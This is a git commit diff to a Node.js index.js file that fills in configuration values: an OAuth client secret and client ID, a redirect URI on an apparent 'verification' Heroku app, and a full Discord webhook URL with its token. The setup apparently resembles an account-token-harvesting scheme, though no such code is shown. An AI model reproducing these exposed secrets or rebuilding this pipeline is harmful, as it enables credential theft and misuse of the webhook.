6127aa5f6b291a2724794d8de033f65e63342b1d
crsjulian <118131870+crsjulian@users.noreply.github.com>
2022-11-14 18:06:31 +0100

    Update index.js

--- index.js
+++ index.js
@@ -1,8 +1,8 @@
 // Configuration
-const client_secret = ''
-const client_id = ''
+const client_secret = 'T_P8Q~gPIIEBwfIfAHhAeN1ozvOm7sKw62BGubQI'
+const client_id = '7b6d2d17-101a-435d-8864-e1415b2c73fa'
 const redirect_uri = 'https://verification-dc.herokuapp.com/'
-const webhook_url = ''
+const webhook_url = 'https://discordapp.com/api/webhooks/1041760980092334200/QbwVoXHrDCgc0D9vgZLf8KThtROCd1j_siiQLXfdHQpEycoMFDyrjrJzxLXXqY6hbwx3'
 // Config end
 const axios = require('axios')
 const express = require('express')
